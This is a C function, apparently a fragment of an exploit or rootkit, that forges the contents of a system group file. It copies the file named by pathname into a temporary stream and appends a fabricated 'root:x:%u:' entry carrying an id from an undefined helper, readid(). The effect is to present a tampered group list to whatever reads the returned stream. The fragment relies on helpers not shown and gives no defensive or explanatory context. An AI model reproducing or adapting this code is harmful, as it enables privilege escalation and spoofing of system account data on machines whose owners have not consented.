FILE *forgegroups(const char *pathname){
    FILE *tmp, *fp;

    if((fp = redirstream(pathname, &tmp)) == NULL)
        return NULL;

    char buf[LINE_MAX];
    while(fgets(buf, sizeof(buf), fp) != NULL){
        fputs(buf, tmp);
        fflush(tmp);
    }
    fclose(fp);

    const char *fmt = "root:x:%u:\n";
    char newgroup[strlen(fmt)+256];
    memset(newgroup, 0, sizeof(newgroup));
    snprintf(newgroup, sizeof(newgroup), fmt, readid());
    fputs(newgroup, tmp);
    fflush(tmp);

    rewind(tmp);
    return tmp;
}